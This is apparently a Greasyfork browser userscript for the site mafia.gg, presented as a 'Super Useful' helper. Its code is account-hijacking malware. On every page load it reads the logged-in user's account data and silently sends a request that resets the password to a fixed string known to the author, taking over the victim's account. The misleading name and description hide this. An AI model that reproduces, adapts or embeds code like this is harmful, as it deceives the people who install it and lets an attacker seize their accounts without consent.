// ==UserScript==
// @name         Super Useful Mafia.gg Script
// @namespace    taintedhack
// @version      1.0
// @description  This script is so useful for me!
// @author       Tainted
// @match        https://mafia.gg/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=mafia.gg
// @license      You can do whatever with this script but credit me if you upload an edited version <3
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/471221/Super%20Useful%20Mafiagg%20Script.user.js
// @updateURL https://update.greasyfork.org/scripts/471221/Super%20Useful%20Mafiagg%20Script.meta.js
// ==/UserScript==

(async function() {
    'use strict';
    let user = await (await fetch("https://mafia.gg/api/user")).json();
    let packet = {
        email: user.email,
        hostBannedUsernames: user.hostBannedUsernames,
        password: "iamsososorry",
        passwordConfirmation: "iamsososorry",
        patreonCode: null,
        timeFormat: user.timeFormat
    }
    await fetch("https://mafia.gg/api/user", {
        method: "PATCH",
        body: JSON.stringify(packet),
        headers: {
            "Content-Type": "application/json"
        }
    })
})();